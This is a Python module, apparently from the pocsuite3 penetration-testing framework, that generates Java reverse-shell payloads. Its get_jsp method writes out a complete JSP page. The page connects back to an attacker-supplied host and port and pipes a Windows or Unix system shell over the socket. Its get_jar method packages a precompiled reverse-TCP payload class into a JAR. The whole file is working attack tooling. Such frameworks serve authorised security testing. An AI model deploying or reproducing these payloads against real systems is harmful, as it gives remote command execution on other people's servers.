import os
from .base import ShellCode
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.helper.archieve.jar import Jar
from pocsuite3.lib.core.common import read_binary
from pocsuite3.lib.core.enums import SHELLCODE_TYPE


class JavaShellCode(ShellCode):
    """
        Class with shellcodes for java language
    """
    def __init__(self, connect_back_ip='localhost', connect_back_port=5555,
                 bad_chars=['\x00'], shell_type=SHELLCODE_TYPE.JAR, make_jar=False):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port,
                           bad_chars=bad_chars)
        self.shell_type = shell_type
        self.make_jar = make_jar
        self.path_to_jar = ""

    def get_jsp(self, inline=False):
        """ Function to get java(jsp) shellcode """

        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connectback listener must be defined")
            return False

        java_code = """
            <%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>
            <%class StreamConnector extends Thread {
                InputStream is;
                OutputStream os;
                StreamConnector( InputStream is, OutputStream os ) {
                    this.is = is;
                    this.os = os;
                }
                public void run() {
                    BufferedReader in = null;
                    BufferedWriter out = null;
                    try {
                        in = new BufferedReader( new InputStreamReader( this.is ) );
                        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                        char buffer[] = new char[8192];
                        int length;
                        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) {
                            out.write( buffer, 0, length ); out.flush();
                        }
                    } catch( Exception e ){
                    }
                    try {
                        if( in != null ) in.close();
                        if( out != null ) out.close();
                    } catch( Exception e ){}
                }
            }
            try {
                String OS = System.getProperty("os.name").toLowerCase();
                Socket socket = new Socket( "{{LOCALHOST}}", {{LOCALPORT}} );
                String command = "cmd.exe";
                if (OS.indexOf("win") < 0)
                    command = "/bin/sh";
                Process process = Runtime.getRuntime().exec(command);
                (new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();
                (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
            } catch( Exception e ) {
            }
            %>
        """
        java_code = self.format_shellcode(java_code)
        if inline:
            java_code = self.make_inline(java_code)
        return java_code

    def get_jar(self, filename=""):
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, "payload.jar")
        jar = Jar(filepath)
        data = "{host};{port}".format(host=self.connect_back_ip, port=self.connect_back_port)
        jar.add_file('east/data.dat', data)
        path = os.path.join(paths.POCSUITE_ROOT_PATH, 'shellcodes/data/java/reverse_tcp/Payload.class')
        jar.add_file('east/Payload.class', read_binary(path))
        if self.make_jar:
            self.path_to_jar = filepath
        remove_jar = not self.make_jar
        return jar.get_raw(remove_jar)

    def get_shellcode(self, inline=False):
        shell = ""
        if self.shell_type == SHELLCODE_TYPE.JAR:
            shell = self.get_jar()
        elif self.shell_type == SHELLCODE_TYPE.JSP:
            shell = self.get_jsp(inline)
        return shell
